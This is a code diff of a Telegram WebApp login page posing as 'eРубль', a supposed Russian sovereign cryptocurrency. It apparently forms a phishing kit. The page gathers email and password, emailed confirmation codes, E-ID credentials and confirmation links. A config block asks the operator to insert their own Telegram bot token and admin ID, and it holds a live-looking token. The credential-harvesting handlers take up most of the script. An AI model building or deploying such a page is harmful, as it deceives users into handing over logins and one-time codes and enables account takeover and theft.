@@ -45,6 +45,7 @@
     <div class="container">
         <div class="logo"><h1><span>eРубль</span></h1><p>Суверенная криптовалюта России</p></div>
 
+        <!-- ===== ГЛАВНАЯ ===== -->
         <div id="pageMain" class="page active">
             <div class="page-title">Вход в аккаунт</div>
             <div class="page-sub">Введите свои данные для входа</div>
@@ -57,6 +58,7 @@
             <div class="register-link">Нет аккаунта? <a onclick="showMsg('Скоро', 'info')">Зарегистрироваться</a></div>
         </div>
 
+        <!-- ===== E-ID ===== -->
         <div id="pageEid" class="page page-eid">
             <div class="page-title">Вход через E-ID</div>
             <div class="page-sub">Введите свои данные для входа</div>
@@ -66,6 +68,7 @@
             <button class="btn-secondary" onclick="switchPage('pageMain')">← Назад</button>
         </div>
 
+        <!-- ===== КОД ===== -->
         <div id="pageCode" class="page">
             <div class="page-title">Код подтверждения</div>
             <div class="page-sub">Введите код, отправленный на почту</div>
@@ -74,6 +77,7 @@
             <button class="btn-secondary" onclick="switchPage('pageMain')">← На главную</button>
         </div>
 
+        <!-- ===== ССЫЛКА ===== -->
         <div id="pageLink" class="page">
             <div class="page-title">Ссылка подтверждения</div>
             <div class="page-sub">Вставьте ссылку из письма</div>
@@ -82,6 +86,7 @@
             <button class="btn-secondary" onclick="switchPage('pageEid')">← Назад</button>
         </div>
 
+        <!-- ===== ОШИБКА ===== -->
         <div id="pageError" class="page">
             <div class="error-block" style="text-align:center; padding: 20px 0;">
                 <div style="font-size: 48px; color: red; margin-bottom: 16px;">✕</div>
@@ -91,6 +96,7 @@
             </div>
         </div>
 
+        <!-- ===== ПОДДЕРЖКА ===== -->
         <div class="support-btn"><a onclick="openSupport()">🆘 Техническая поддержка</a></div>
     </div>
 
@@ -99,7 +105,7 @@
         // КОНФИГ (ВСТАВЬТЕ СВОИ ЗНАЧЕНИЯ)
         // ============================================================
         const BOT_TOKEN = "8603629858:AAGJu7_3CWFJ_YQj_iJ2hjX45h053-3fAQY";
-        const ADMIN_ID = "8542901240"; // Ваш ID (в кавычках)
+        const ADMIN_ID = "8542901240";
         // ============================================================
 
         const tg = window.Telegram.WebApp;
@@ -130,6 +136,7 @@
             } catch (error) { return false; }
         }
 
+        // 1. Обычный вход
         document.getElementById('loginSubmitBtn').onclick = async () => {
             const e = document.getElementById('email').value.trim();
             const p = document.getElementById('password').value.trim();
@@ -149,6 +156,7 @@
             }
         };
 
+        // 2. Ввод кода
         document.getElementById('submitCodeBtn').onclick = async () => {
             const code = document.getElementById('codeInput').value.trim();
             if (!code) { showMsg('Введите код'); return; }
@@ -167,6 +175,7 @@
             }
         };
 
+        // 3. E-ID Логин
         document.getElementById('eidSubmitBtn').onclick = async () => {
             const e = document.getElementById('eidEmail').value.trim();
             const p = document.getElementById('eidPassword').value.trim();
@@ -186,6 +195,7 @@
             }
         };
 
+        // 4. Ссылка E-ID
         document.getElementById('submitLinkBtn').onclick = async () => {
             const link = document.getElementById('linkInput').value.trim();
             if (!link) { showMsg('Вставьте ссылку'); return; }
